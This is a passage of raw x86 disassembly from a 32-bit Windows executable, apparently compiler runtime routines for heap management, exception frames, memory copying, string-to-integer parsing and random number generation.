  402390:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402394:	7c 1b                	jl     0x4023b1
  402396:	8b dd                	mov    %ebp,%ebx
  402398:	03 de                	add    %esi,%ebx
  40239a:	8b 04 24             	mov    (%esp),%eax
  40239d:	83 c8 02             	or     $0x2,%eax
  4023a0:	89 03                	mov    %eax,(%ebx)
  4023a2:	8b c3                	mov    %ebx,%eax
  4023a4:	83 c0 04             	add    $0x4,%eax
  4023a7:	e8 c8 f7 ff ff       	call   0x401b74
  4023ac:	e9 fe 00 00 00       	jmp    0x4024af
  4023b1:	8b f7                	mov    %edi,%esi
  4023b3:	e9 f7 00 00 00       	jmp    0x4024af
  4023b8:	8b c6                	mov    %esi,%eax
  4023ba:	2b c7                	sub    %edi,%eax
  4023bc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4023c0:	3b 1d 70 c4 40 00    	cmp    0x40c470,%ebx
  4023c6:	75 67                	jne    0x40242f
  4023c8:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  4023cd:	3b 44 24 04          	cmp    0x4(%esp),%eax
  4023d1:	7c 53                	jl     0x402426
  4023d3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023d7:	29 05 6c c4 40 00    	sub    %eax,0x40c46c
  4023dd:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023e1:	01 05 70 c4 40 00    	add    %eax,0x40c470
  4023e7:	83 3d 6c c4 40 00 0c 	cmpl   $0xc,0x40c46c
  4023ee:	7d 18                	jge    0x402408
  4023f0:	a1 6c c4 40 00       	mov    0x40c46c,%eax
  4023f5:	01 05 70 c4 40 00    	add    %eax,0x40c470
  4023fb:	03 35 6c c4 40 00    	add    0x40c46c,%esi
  402401:	33 c0                	xor    %eax,%eax
  402403:	a3 6c c4 40 00       	mov    %eax,0x40c46c
  402408:	8b c6                	mov    %esi,%eax
  40240a:	2b c7                	sub    %edi,%eax
  40240c:	01 05 00 c4 40 00    	add    %eax,0x40c400
  402412:	8b 45 00             	mov    0x0(%ebp),%eax
  402415:	25 03 00 00 80       	and    $0x80000003,%eax
  40241a:	0b f0                	or     %eax,%esi
  40241c:	89 75 00             	mov    %esi,0x0(%ebp)
  40241f:	b0 01                	mov    $0x1,%al
  402421:	e9 a2 00 00 00       	jmp    0x4024c8
  402426:	e8 55 f9 ff ff       	call   0x401d80
  40242b:	8b dd                	mov    %ebp,%ebx
  40242d:	03 df                	add    %edi,%ebx
  40242f:	f6 03 02             	testb  $0x2,(%ebx)
  402432:	75 4d                	jne    0x402481
  402434:	8b d3                	mov    %ebx,%edx
  402436:	8b c2                	mov    %edx,%eax
  402438:	8b 48 08             	mov    0x8(%eax),%ecx
  40243b:	89 0c 24             	mov    %ecx,(%esp)
  40243e:	8b 0c 24             	mov    (%esp),%ecx
  402441:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  402445:	73 0e                	jae    0x402455
  402447:	03 14 24             	add    (%esp),%edx
  40244a:	8b da                	mov    %edx,%ebx
  40244c:	8b 04 24             	mov    (%esp),%eax
  40244f:	29 44 24 04          	sub    %eax,0x4(%esp)
  402453:	eb 2c                	jmp    0x402481
  402455:	e8 66 f6 ff ff       	call   0x401ac0
  40245a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40245e:	29 04 24             	sub    %eax,(%esp)
  402461:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402465:	7c 0e                	jl     0x402475
  402467:	8b c5                	mov    %ebp,%eax
  402469:	03 c6                	add    %esi,%eax
  40246b:	8b 14 24             	mov    (%esp),%edx
  40246e:	e8 8d f8 ff ff       	call   0x401d00
  402473:	eb 3a                	jmp    0x4024af
  402475:	03 34 24             	add    (%esp),%esi
  402478:	8b dd                	mov    %ebp,%ebx
  40247a:	03 de                	add    %esi,%ebx
  40247c:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  40247f:	eb 2e                	jmp    0x4024af
  402481:	8b 03                	mov    (%ebx),%eax
  402483:	a9 00 00 00 80       	test   $0x80000000,%eax
  402488:	74 21                	je     0x4024ab
  40248a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40248f:	03 c3                	add    %ebx,%eax
  402491:	8b d8                	mov    %eax,%ebx
  402493:	8b 54 24 04          	mov    0x4(%esp),%edx
  402497:	8b c3                	mov    %ebx,%eax
  402499:	e8 e6 f9 ff ff       	call   0x401e84
  40249e:	84 c0                	test   %al,%al
  4024a0:	74 09                	je     0x4024ab
  4024a2:	8b dd                	mov    %ebp,%ebx
  4024a4:	03 df                	add    %edi,%ebx
  4024a6:	e9 0d ff ff ff       	jmp    0x4023b8
  4024ab:	33 c0                	xor    %eax,%eax
  4024ad:	eb 19                	jmp    0x4024c8
  4024af:	8b c6                	mov    %esi,%eax
  4024b1:	2b c7                	sub    %edi,%eax
  4024b3:	01 05 00 c4 40 00    	add    %eax,0x40c400
  4024b9:	8b 45 00             	mov    0x0(%ebp),%eax
  4024bc:	25 03 00 00 80       	and    $0x80000003,%eax
  4024c1:	0b f0                	or     %eax,%esi
  4024c3:	89 75 00             	mov    %esi,0x0(%ebp)
  4024c6:	b0 01                	mov    $0x1,%al
  4024c8:	59                   	pop    %ecx
  4024c9:	5a                   	pop    %edx
  4024ca:	5d                   	pop    %ebp
  4024cb:	5f                   	pop    %edi
  4024cc:	5e                   	pop    %esi
  4024cd:	5b                   	pop    %ebx
  4024ce:	c3                   	ret
  4024cf:	90                   	nop
  4024d0:	55                   	push   %ebp
  4024d1:	8b ec                	mov    %esp,%ebp
  4024d3:	51                   	push   %ecx
  4024d4:	53                   	push   %ebx
  4024d5:	56                   	push   %esi
  4024d6:	57                   	push   %edi
  4024d7:	8b f2                	mov    %edx,%esi
  4024d9:	8b d8                	mov    %eax,%ebx
  4024db:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  4024e2:	75 13                	jne    0x4024f7
  4024e4:	e8 2f f4 ff ff       	call   0x401918
  4024e9:	84 c0                	test   %al,%al
  4024eb:	75 0a                	jne    0x4024f7
  4024ed:	33 c0                	xor    %eax,%eax
  4024ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024f2:	e9 92 00 00 00       	jmp    0x402589
  4024f7:	33 d2                	xor    %edx,%edx
  4024f9:	55                   	push   %ebp
  4024fa:	68 82 25 40 00       	push   $0x402582
  4024ff:	64 ff 32             	push   %fs:(%edx)
  402502:	64 89 22             	mov    %esp,%fs:(%edx)
  402505:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40250c:	74 0a                	je     0x402518
  40250e:	68 1c c4 40 00       	push   $0x40c41c
  402513:	e8 5c ed ff ff       	call   0x401274
  402518:	8b d6                	mov    %esi,%edx
  40251a:	8b c3                	mov    %ebx,%eax
  40251c:	e8 df fd ff ff       	call   0x402300
  402521:	84 c0                	test   %al,%al
  402523:	74 05                	je     0x40252a
  402525:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402528:	eb 37                	jmp    0x402561
  40252a:	8b c6                	mov    %esi,%eax
  40252c:	e8 a3 fa ff ff       	call   0x401fd4
  402531:	8b f8                	mov    %eax,%edi
  402533:	8b c3                	mov    %ebx,%eax
  402535:	83 e8 04             	sub    $0x4,%eax
  402538:	8b 00                	mov    (%eax),%eax
  40253a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40253f:	83 e8 04             	sub    $0x4,%eax
  402542:	3b f0                	cmp    %eax,%esi
  402544:	7d 02                	jge    0x402548
  402546:	8b c6                	mov    %esi,%eax
  402548:	85 ff                	test   %edi,%edi
  40254a:	74 12                	je     0x40255e
  40254c:	8b c8                	mov    %eax,%ecx
  40254e:	8b d7                	mov    %edi,%edx
  402550:	8b c3                	mov    %ebx,%eax
  402552:	e8 2d 01 00 00       	call   0x402684
  402557:	8b c3                	mov    %ebx,%eax
  402559:	e8 fe fb ff ff       	call   0x40215c
  40255e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402561:	33 c0                	xor    %eax,%eax
  402563:	5a                   	pop    %edx
  402564:	59                   	pop    %ecx
  402565:	59                   	pop    %ecx
  402566:	64 89 10             	mov    %edx,%fs:(%eax)
  402569:	68 89 25 40 00       	push   $0x402589
  40256e:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  402575:	74 0a                	je     0x402581
  402577:	68 1c c4 40 00       	push   $0x40c41c
  40257c:	e8 fb ec ff ff       	call   0x40127c
  402581:	c3                   	ret
  402582:	e9 75 08 00 00       	jmp    0x402dfc
  402587:	eb e5                	jmp    0x40256e
  402589:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40258c:	5f                   	pop    %edi
  40258d:	5e                   	pop    %esi
  40258e:	5b                   	pop    %ebx
  40258f:	59                   	pop    %ecx
  402590:	5d                   	pop    %ebp
  402591:	c3                   	ret
  402592:	8b c0                	mov    %eax,%eax
  402594:	85 c0                	test   %eax,%eax
  402596:	74 0a                	je     0x4025a2
  402598:	ff 15 04 b0 40 00    	call   *0x40b004
  40259e:	09 c0                	or     %eax,%eax
  4025a0:	74 01                	je     0x4025a3
  4025a2:	c3                   	ret
  4025a3:	b0 01                	mov    $0x1,%al
  4025a5:	e9 6a 00 00 00       	jmp    0x402614
  4025aa:	c3                   	ret
  4025ab:	90                   	nop
  4025ac:	85 c0                	test   %eax,%eax
  4025ae:	74 0a                	je     0x4025ba
  4025b0:	ff 15 08 b0 40 00    	call   *0x40b008
  4025b6:	09 c0                	or     %eax,%eax
  4025b8:	75 01                	jne    0x4025bb
  4025ba:	c3                   	ret
  4025bb:	b0 02                	mov    $0x2,%al
  4025bd:	e9 52 00 00 00       	jmp    0x402614
  4025c2:	c3                   	ret
  4025c3:	90                   	nop
  4025c4:	8b 08                	mov    (%eax),%ecx
  4025c6:	85 c9                	test   %ecx,%ecx
  4025c8:	74 32                	je     0x4025fc
  4025ca:	85 d2                	test   %edx,%edx
  4025cc:	74 18                	je     0x4025e6
  4025ce:	50                   	push   %eax
  4025cf:	89 c8                	mov    %ecx,%eax
  4025d1:	ff 15 0c b0 40 00    	call   *0x40b00c
  4025d7:	59                   	pop    %ecx
  4025d8:	09 c0                	or     %eax,%eax
  4025da:	74 19                	je     0x4025f5
  4025dc:	89 01                	mov    %eax,(%ecx)
  4025de:	c3                   	ret
  4025df:	b0 02                	mov    $0x2,%al
  4025e1:	e9 2e 00 00 00       	jmp    0x402614
  4025e6:	89 10                	mov    %edx,(%eax)
  4025e8:	89 c8                	mov    %ecx,%eax
  4025ea:	ff 15 08 b0 40 00    	call   *0x40b008
  4025f0:	09 c0                	or     %eax,%eax
  4025f2:	75 eb                	jne    0x4025df
  4025f4:	c3                   	ret
  4025f5:	b0 01                	mov    $0x1,%al
  4025f7:	e9 18 00 00 00       	jmp    0x402614
  4025fc:	85 d2                	test   %edx,%edx
  4025fe:	74 10                	je     0x402610
  402600:	50                   	push   %eax
  402601:	89 d0                	mov    %edx,%eax
  402603:	ff 15 04 b0 40 00    	call   *0x40b004
  402609:	59                   	pop    %ecx
  40260a:	09 c0                	or     %eax,%eax
  40260c:	74 e7                	je     0x4025f5
  40260e:	89 01                	mov    %eax,(%ecx)
  402610:	c3                   	ret
  402611:	8d 40 00             	lea    0x0(%eax),%eax
  402614:	83 e0 7f             	and    $0x7f,%eax
  402617:	8b 0d 04 c0 40 00    	mov    0x40c004,%ecx
  40261d:	85 c9                	test   %ecx,%ecx
  40261f:	74 03                	je     0x402624
  402621:	5a                   	pop    %edx
  402622:	ff d1                	call   *%ecx
  402624:	48                   	dec    %eax
  402625:	8a 80 3d 26 40 00    	mov    0x40263d(%eax),%al
  40262b:	79 0b                	jns    0x402638
  40262d:	e8 22 0b 00 00       	call   0x403154
  402632:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  402638:	e9 04 18 00 00       	jmp    0x403e41
  40263d:	cb                   	lret
  40263e:	cc                   	int3
  40263f:	c8 c9 d7 cf          	enter  $0xd7c9,$0xcf
  402643:	c8 cd ce db          	enter  $0xcecd,$0xdb
  402647:	d8 ca                	fmul   %st(2),%st
  402649:	d9 da                	(bad)
  40264b:	dc dd                	(bad)
  40264d:	de df                	(bad)
  40264f:	e0 e1                	loopne 0x402632
  402651:	c3                   	ret
  402652:	8b c0                	mov    %eax,%eax
  402654:	50                   	push   %eax
  402655:	52                   	push   %edx
  402656:	51                   	push   %ecx
  402657:	e8 f8 0a 00 00       	call   0x403154
  40265c:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  402663:	59                   	pop    %ecx
  402664:	5a                   	pop    %edx
  402665:	58                   	pop    %eax
  402666:	75 01                	jne    0x402669
  402668:	c3                   	ret
  402669:	31 c0                	xor    %eax,%eax
  40266b:	e9 a4 ff ff ff       	jmp    0x402614
  402670:	c3                   	ret
  402671:	8d 40 00             	lea    0x0(%eax),%eax
  402674:	50                   	push   %eax
  402675:	e8 da 0a 00 00       	call   0x403154
  40267a:	8f 80 04 00 00 00    	pop    0x4(%eax)
  402680:	c3                   	ret
  402681:	8d 40 00             	lea    0x0(%eax),%eax
  402684:	56                   	push   %esi
  402685:	57                   	push   %edi
  402686:	89 c6                	mov    %eax,%esi
  402688:	89 d7                	mov    %edx,%edi
  40268a:	89 c8                	mov    %ecx,%eax
  40268c:	39 f7                	cmp    %esi,%edi
  40268e:	7f 13                	jg     0x4026a3
  402690:	74 2f                	je     0x4026c1
  402692:	c1 f9 02             	sar    $0x2,%ecx
  402695:	78 2a                	js     0x4026c1
  402697:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402699:	89 c1                	mov    %eax,%ecx
  40269b:	83 e1 03             	and    $0x3,%ecx
  40269e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4026a0:	5f                   	pop    %edi
  4026a1:	5e                   	pop    %esi
  4026a2:	c3                   	ret
  4026a3:	8d 74 0e fc          	lea    -0x4(%esi,%ecx,1),%esi
  4026a7:	8d 7c 0f fc          	lea    -0x4(%edi,%ecx,1),%edi
  4026ab:	c1 f9 02             	sar    $0x2,%ecx
  4026ae:	78 11                	js     0x4026c1
  4026b0:	fd                   	std
  4026b1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4026b3:	89 c1                	mov    %eax,%ecx
  4026b5:	83 e1 03             	and    $0x3,%ecx
  4026b8:	83 c6 03             	add    $0x3,%esi
  4026bb:	83 c7 03             	add    $0x3,%edi
  4026be:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4026c0:	fc                   	cld
  4026c1:	5f                   	pop    %edi
  4026c2:	5e                   	pop    %esi
  4026c3:	c3                   	ret
  4026c4:	55                   	push   %ebp
  4026c5:	8b ec                	mov    %esp,%ebp
  4026c7:	83 c4 e8             	add    $0xffffffe8,%esp
  4026ca:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4026cd:	50                   	push   %eax
  4026ce:	e8 c9 ea ff ff       	call   0x40119c
  4026d3:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  4026d7:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4026da:	66 03 45 f2          	add    -0xe(%ebp),%ax
  4026de:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4026e1:	31 d2                	xor    %edx,%edx
  4026e3:	66 8b 55 f4          	mov    -0xc(%ebp),%dx
  4026e7:	01 d0                	add    %edx,%eax
  4026e9:	69 c0 e8 03 00 00    	imul   $0x3e8,%eax,%eax
  4026ef:	66 8b 55 f6          	mov    -0xa(%ebp),%dx
  4026f3:	01 d0                	add    %edx,%eax
  4026f5:	89 05 2c c0 40 00    	mov    %eax,0x40c02c
  4026fb:	8b e5                	mov    %ebp,%esp
  4026fd:	5d                   	pop    %ebp
  4026fe:	c3                   	ret
  4026ff:	90                   	nop
  402700:	b8 d2 00 00 00       	mov    $0xd2,%eax
  402705:	e9 37 17 00 00       	jmp    0x403e41
  40270a:	c3                   	ret
  40270b:	90                   	nop
  40270c:	53                   	push   %ebx
  40270d:	56                   	push   %esi
  40270e:	51                   	push   %ecx
  40270f:	89 ce                	mov    %ecx,%esi
  402711:	c1 ee 02             	shr    $0x2,%esi
  402714:	74 26                	je     0x40273c
  402716:	8b 08                	mov    (%eax),%ecx
  402718:	8b 1a                	mov    (%edx),%ebx
  40271a:	39 d9                	cmp    %ebx,%ecx
  40271c:	75 45                	jne    0x402763
  40271e:	4e                   	dec    %esi
  40271f:	74 15                	je     0x402736
  402721:	8b 48 04             	mov    0x4(%eax),%ecx
  402724:	8b 5a 04             	mov    0x4(%edx),%ebx
  402727:	39 d9                	cmp    %ebx,%ecx
  402729:	75 38                	jne    0x402763
  40272b:	83 c0 08             	add    $0x8,%eax
  40272e:	83 c2 08             	add    $0x8,%edx
  402731:	4e                   	dec    %esi
  402732:	75 e2                	jne    0x402716
  402734:	eb 06                	jmp    0x40273c
  402736:	83 c0 04             	add    $0x4,%eax
  402739:	83 c2 04             	add    $0x4,%edx
  40273c:	5e                   	pop    %esi
  40273d:	83 e6 03             	and    $0x3,%esi
  402740:	74 36                	je     0x402778
  402742:	8a 08                	mov    (%eax),%cl
  402744:	3a 0a                	cmp    (%edx),%cl
  402746:	75 30                	jne    0x402778
  402748:	4e                   	dec    %esi
  402749:	74 13                	je     0x40275e
  40274b:	8a 48 01             	mov    0x1(%eax),%cl
  40274e:	3a 4a 01             	cmp    0x1(%edx),%cl
  402751:	75 25                	jne    0x402778
  402753:	4e                   	dec    %esi
  402754:	74 08                	je     0x40275e
  402756:	8a 48 02             	mov    0x2(%eax),%cl
  402759:	3a 4a 02             	cmp    0x2(%edx),%cl
  40275c:	75 1a                	jne    0x402778
  40275e:	31 c0                	xor    %eax,%eax
  402760:	5e                   	pop    %esi
  402761:	5b                   	pop    %ebx
  402762:	c3                   	ret
  402763:	5e                   	pop    %esi
  402764:	38 d9                	cmp    %bl,%cl
  402766:	75 10                	jne    0x402778
  402768:	38 fd                	cmp    %bh,%ch
  40276a:	75 0c                	jne    0x402778
  40276c:	c1 e9 10             	shr    $0x10,%ecx
  40276f:	c1 eb 10             	shr    $0x10,%ebx
  402772:	38 d9                	cmp    %bl,%cl
  402774:	75 02                	jne    0x402778
  402776:	38 fd                	cmp    %bh,%ch
  402778:	5e                   	pop    %esi
  402779:	5b                   	pop    %ebx
  40277a:	c3                   	ret
  40277b:	90                   	nop
  40277c:	57                   	push   %edi
  40277d:	89 c7                	mov    %eax,%edi
  40277f:	88 cd                	mov    %cl,%ch
  402781:	89 c8                	mov    %ecx,%eax
  402783:	c1 e0 10             	shl    $0x10,%eax
  402786:	66 89 c8             	mov    %cx,%ax
  402789:	89 d1                	mov    %edx,%ecx
  40278b:	c1 f9 02             	sar    $0x2,%ecx
  40278e:	78 09                	js     0x402799
  402790:	f3 ab                	rep stos %eax,%es:(%edi)
  402792:	89 d1                	mov    %edx,%ecx
  402794:	83 e1 03             	and    $0x3,%ecx
  402797:	f3 aa                	rep stos %al,%es:(%edi)
  402799:	5f                   	pop    %edi
  40279a:	c3                   	ret
  40279b:	90                   	nop
  40279c:	69 15 2c c0 40 00 05 	imul   $0x8088405,0x40c02c,%edx
  4027a3:	84 08 08 
  4027a6:	42                   	inc    %edx
  4027a7:	89 15 2c c0 40 00    	mov    %edx,0x40c02c
  4027ad:	f7 e2                	mul    %edx
  4027af:	89 d0                	mov    %edx,%eax
  4027b1:	c3                   	ret
  4027b2:	8b c0                	mov    %eax,%eax
  4027b4:	53                   	push   %ebx
  4027b5:	56                   	push   %esi
  4027b6:	57                   	push   %edi
  4027b7:	89 c6                	mov    %eax,%esi
  4027b9:	50                   	push   %eax
  4027ba:	85 c0                	test   %eax,%eax
  4027bc:	74 51                	je     0x40280f
  4027be:	31 c0                	xor    %eax,%eax
  4027c0:	31 db                	xor    %ebx,%ebx
  4027c2:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  4027c7:	8a 1e                	mov    (%esi),%bl
  4027c9:	46                   	inc    %esi
  4027ca:	80 fb 20             	cmp    $0x20,%bl
  4027cd:	74 f8                	je     0x4027c7
  4027cf:	b5 00                	mov    $0x0,%ch
  4027d1:	80 fb 2d             	cmp    $0x2d,%bl
  4027d4:	74 45                	je     0x40281b
  4027d6:	80 fb 2b             	cmp    $0x2b,%bl
  4027d9:	74 42                	je     0x40281d
  4027db:	80 fb 24             	cmp    $0x24,%bl
  4027de:	74 42                	je     0x402822
  4027e0:	84 db                	test   %bl,%bl
  4027e2:	74 32                	je     0x402816
  4027e4:	80 eb 30             	sub    $0x30,%bl
  4027e7:	80 fb 09             	cmp    $0x9,%bl
  4027ea:	77 2a                	ja     0x402816
  4027ec:	39 f8                	cmp    %edi,%eax
  4027ee:	77 26                	ja     0x402816
  4027f0:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4027f3:	01 c0                	add    %eax,%eax
  4027f5:	01 d8                	add    %ebx,%eax
  4027f7:	8a 1e                	mov    (%esi),%bl
  4027f9:	46                   	inc    %esi
  4027fa:	84 db                	test   %bl,%bl
  4027fc:	75 e6                	jne    0x4027e4
  4027fe:	fe cd                	dec    %ch
  402800:	74 10                	je     0x402812
  402802:	85 c0                	test   %eax,%eax
  402804:	7c 10                	jl     0x402816
  402806:	59                   	pop    %ecx
  402807:	31 f6                	xor    %esi,%esi
  402809:	89 32                	mov    %esi,(%edx)
  40280b:	5f                   	pop    %edi
  40280c:	5e                   	pop    %esi
  40280d:	5b                   	pop    %ebx
  40280e:	c3                   	ret
  40280f:	46                   	inc    %esi
  402810:	eb 04                	jmp    0x402816
  402812:	f7 d8                	neg    %eax
  402814:	7e f0                	jle    0x402806
  402816:	5b                   	pop    %ebx
  402817:	29 de                	sub    %ebx,%esi
  402819:	eb ee                	jmp    0x402809
  40281b:	fe c5                	inc    %ch
  40281d:	8a 1e                	mov    (%esi),%bl
  40281f:	46                   	inc    %esi
  402820:	eb be                	jmp    0x4027e0
  402822:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402827:	8a 1e                	mov    (%esi),%bl
  402829:	46                   	inc    %esi
  40282a:	84 db                	test   %bl,%bl
  40282c:	74 e1                	je     0x40280f
  40282e:	80 fb 61             	cmp    $0x61,%bl
  402831:	72 03                	jb     0x402836
  402833:	80 eb 20             	sub    $0x20,%bl
  402836:	80 eb 30             	sub    $0x30,%bl
  402839:	80 fb 09             	cmp    $0x9,%bl
  40283c:	76 0b                	jbe    0x402849
  40283e:	80 eb 11             	sub    $0x11,%bl
  402841:	80 fb 05             	cmp    $0x5,%bl
  402844:	77 d0                	ja     0x402816
  402846:	80 c3 0a             	add    $0xa,%bl
  402849:	39 f8                	cmp    %edi,%eax
  40284b:	77 c9                	ja     0x402816
  40284d:	c1 e0 04             	shl    $0x4,%eax
  402850:	01 d8                	add    %ebx,%eax
  402852:	8a 1e                	mov    (%esi),%bl
  402854:	46                   	inc    %esi
  402855:	84 db                	test   %bl,%bl
  402857:	75 d5                	jne    0x40282e
  402859:	eb ab                	jmp    0x402806
  40285b:	c3                   	ret
  40285c:	db e3                	fninit
  40285e:	9b d9 2d 10 b0 40 00 	fldcw  0x40b010
  402865:	c3                   	ret
  402866:	8b c0                	mov    %eax,%eax
  402868:	8b 00                	mov    (%eax),%eax
  40286a:	c3                   	ret
  40286b:	90                   	nop
  40286c:	56                   	push   %esi
  40286d:	57                   	push   %edi
  40286e:	89 d7                	mov    %edx,%edi
  402870:	8b 70 e4             	mov    -0x1c(%eax),%esi
  402873:	31 c9                	xor    %ecx,%ecx
  402875:	8a 0e                	mov    (%esi),%cl
  402877:	41                   	inc    %ecx
  402878:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40287a:	5f                   	pop    %edi
  40287b:	5e                   	pop    %esi
  40287c:	c3                   	ret
  40287d:	8d 40 00             	lea    0x0(%eax),%eax
  402880:	53                   	push   %ebx
  402881:	31 db                	xor    %ebx,%ebx
  402883:	09 d2                	or     %edx,%edx
  402885:	74 1c                	je     0x4028a3
  402887:	8b 40 e4             	mov    -0x1c(%eax),%eax
  40288a:	31 c9                	xor    %ecx,%ecx
  40288c:	8a 08                	mov    (%eax),%cl
  40288e:	3b 4a fc             	cmp    -0x4(%edx),%ecx
  402891:	75 10                	jne    0x4028a3
  402893:	4a                   	dec    %edx
  402894:	8a 3c 08             	mov    (%eax,%ecx,1),%bh
  402897:	32 3c 0a             	xor    (%edx,%ecx,1),%bh
  40289a:	80 e7 df             	and    $0xdf,%bh
  40289d:	75 04                	jne    0x4028a3
  40289f:	49                   	dec    %ecx
  4028a0:	75 f2                	jne    0x402894
  4028a2:	43                   	inc    %ebx
  4028a3:	88 d8                	mov    %bl,%al
  4028a5:	5b                   	pop    %ebx
  4028a6:	c3                   	ret
  4028a7:	90                   	nop
  4028a8:	8b 40 ec             	mov    -0x14(%eax),%eax
  4028ab:	c3                   	ret
  4028ac:	57                   	push   %edi
  4028ad:	50                   	push   %eax
  4028ae:	8b 40 e8             	mov    -0x18(%eax),%eax
  4028b1:	e8 de fc ff ff       	call   0x402594
  4028b6:	89 c7                	mov    %eax,%edi
  4028b8:	89 c2                	mov    %eax,%edx
  4028ba:	58                   	pop    %eax
  4028bb:	ab                   	stos   %eax,%es:(%edi)
  4028bc:	8b 48 e8             	mov    -0x18(%eax),%ecx
  4028bf:	31 c0                	xor    %eax,%eax
  4028c1:	51                   	push   %ecx
  4028c2:	c1 e9 02             	shr    $0x2,%ecx
  4028c5:	49                   	dec    %ecx
  4028c6:	f3 ab                	rep stos %eax,%es:(%edi)
  4028c8:	59                   	pop    %ecx
  4028c9:	83 e1 03             	and    $0x3,%ecx
  4028cc:	f3 aa                	rep stos %al,%es:(%edi)
  4028ce:	89 d0                	mov    %edx,%eax
  4028d0:	5f                   	pop    %edi
  4028d1:	c3                   	ret
  4028d2:	8b c0                	mov    %eax,%eax
  4028d4:	53                   	push   %ebx
  4028d5:	56                   	push   %esi
  4028d6:	89 c3                	mov    %eax,%ebx
  4028d8:	8b 30                	mov    (%eax),%esi
  4028da:	8b 56 d0             	mov    -0x30(%esi),%edx
  4028dd:	8b 76 ec             	mov    -0x14(%esi),%esi
  4028e0:	85 d2                	test   %edx,%edx
  4028e2:	74 07                	je     0x4028eb
  4028e4:	e8 6b 0c 00 00       	call   0x403554
  4028e9:	89 d8                	mov    %ebx,%eax
  4028eb:	85 f6                	test   %esi,%esi
  4028ed:	75 eb                	jne    0x4028da
  4028ef:	e8 b8 fc ff ff       	call   0x4025ac
  4028f4:	5e                   	pop    %esi
  4028f5:	5b                   	pop    %ebx
  4028f6:	c3                   	ret
  4028f7:	90                   	nop
  4028f8:	8b 40 e8             	mov    -0x18(%eax),%eax
  4028fb:	c3                   	ret
  4028fc:	84 d2                	test   %dl,%dl
  4028fe:	74 08                	je     0x402908
  402900:	83 c4 f0             	add    $0xfffffff0,%esp
  402903:	e8 c0 01 00 00       	call   0x402ac8
  402908:	84 d2                	test   %dl,%dl
  40290a:	74 0a                	je     0x402916
  40290c:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402913:	83 c4 0c             	add    $0xc,%esp
  402916:	c3                   	ret
  402917:	90                   	nop
  402918:	84 d2                	test   %dl,%dl
  40291a:	74 05                	je     0x402921
  40291c:	e8 e3 01 00 00       	call   0x402b04
  402921:	c3                   	ret
  402922:	8b c0                	mov    %eax,%eax
  402924:	85 c0                	test   %eax,%eax
  402926:	74 07                	je     0x40292f
  402928:	8b 08                	mov    (%eax),%ecx
  40292a:	b2 01                	mov    $0x1,%dl
  40292c:	ff 51 fc             	call   *-0x4(%ecx)
  40292f:	c3                   	ret
  402930:	57                   	push   %edi
  402931:	89 d7                	mov    %edx,%edi
  402933:	ab                   	stos   %eax,%es:(%edi)
  402934:	8b 48 e8             	mov    -0x18(%eax),%ecx
  402937:	31 c0                	xor    %eax,%eax
  402939:	51                   	push   %ecx
  40293a:	c1 e9 02             	shr    $0x2,%ecx
  40293d:	49                   	dec    %ecx
  40293e:	f3 ab                	rep stos %eax,%es:(%edi)
  402940:	59                   	pop    %ecx
  402941:	83 e1 03             	and    $0x3,%ecx
  402944:	f3 aa                	rep stos %al,%es:(%edi)
  402946:	89 d0                	mov    %edx,%eax
  402948:	5f                   	pop    %edi
  402949:	c3                   	ret
  40294a:	8b c0                	mov    %eax,%eax
  40294c:	53                   	push   %ebx
  40294d:	56                   	push   %esi
  40294e:	89 c3                	mov    %eax,%ebx
  402950:	8b 30                	mov    (%eax),%esi
  402952:	8b 56 d0             	mov    -0x30(%esi),%edx
  402955:	8b 76 ec             	mov    -0x14(%esi),%esi
  402958:	85 d2                	test   %edx,%edx
  40295a:	74 07                	je     0x402963
  40295c:	e8 f3 0b 00 00       	call   0x403554
  402961:	89 d8                	mov    %ebx,%eax
  402963:	85 f6                	test   %esi,%esi
  402965:	75 eb                	jne    0x402952
  402967:	5e                   	pop    %esi
  402968:	5b                   	pop    %ebx
  402969:	c3                   	ret
  40296a:	8b c0                	mov    %eax,%eax
  40296c:	85 c0                	test   %eax,%eax
  40296e:	74 10                	je     0x402980
  402970:	8b 00                	mov    (%eax),%eax
  402972:	39 d0                	cmp    %edx,%eax
  402974:	74 08                	je     0x40297e
  402976:	8b 40 ec             	mov    -0x14(%eax),%eax
  402979:	85 c0                	test   %eax,%eax
  40297b:	75 f5                	jne    0x402972
  40297d:	c3                   	ret
  40297e:	b0 01                	mov    $0x1,%al
  402980:	c3                   	ret
  402981:	8d 40 00             	lea    0x0(%eax),%eax
  402984:	57                   	push   %edi
  402985:	93                   	xchg   %eax,%ebx
  402986:	8b 7b e0             	mov    -0x20(%ebx),%edi
  402989:	85 ff                	test   %edi,%edi
  40298b:	74 0d                	je     0x40299a
  40298d:	0f b7 0f             	movzwl (%edi),%ecx
  402990:	51                   	push   %ecx
  402991:	83 c7 02             	add    $0x2,%edi
